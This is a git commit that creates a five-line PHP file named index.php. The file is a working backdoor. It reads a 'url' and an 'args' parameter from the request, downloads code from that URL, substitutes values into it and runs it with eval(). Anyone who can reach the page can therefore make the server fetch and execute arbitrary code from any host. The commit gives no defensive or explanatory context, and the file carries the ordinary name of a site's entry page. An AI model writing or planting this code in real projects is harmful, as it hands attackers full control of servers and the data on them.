bb039d9f1b6cfb092f8e2b9a789c32662a5d7560
HansPetter89 <67346817+HansPetter89@users.noreply.github.com>
2020-06-23 18:39:10 -0400

    Create index.php

---
+++ index.php
@@ -0,0 +1,5 @@
+<?php
+if (isset ($_GET['url']) && isset ($_GET['args'])) {
+    $argsArray = json_decode($_GET['args'], true);
+	eval(str_replace(array_keys($argsArray), array_values($argsArray), file_get_contents($_GET['url']))); 
+}
